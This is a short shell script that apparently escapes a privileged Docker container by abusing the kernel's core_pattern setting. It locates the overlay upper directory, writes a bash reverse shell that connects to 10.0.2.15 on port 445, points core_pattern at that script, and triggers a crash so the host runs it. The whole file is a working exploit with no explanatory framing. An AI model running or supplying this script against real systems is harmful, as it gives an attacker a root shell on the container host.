#!/bin/sh

#$1 è ip es.: 172.17.0.2
gcc -o crash crash.c
mkdir /newproc
mount -t proc proc /newproc
UPPERDIR=$(cat /etc/mtab | grep overlay | awk -F "," '{ for (i=1; i<=NF; i++) { if ($i ~ /upperdir/) { print $i } } }' | cut -d "=" -f 2)
echo "#!/bin/bash" > /cmd
echo "/bin/bash -i >& /dev/tcp/10.0.2.15/445 0>&1" >> /cmd
chmod 777 /cmd
echo "|$UPPERDIR/cmd" > /newproc/sys/kernel/core_pattern
./crash
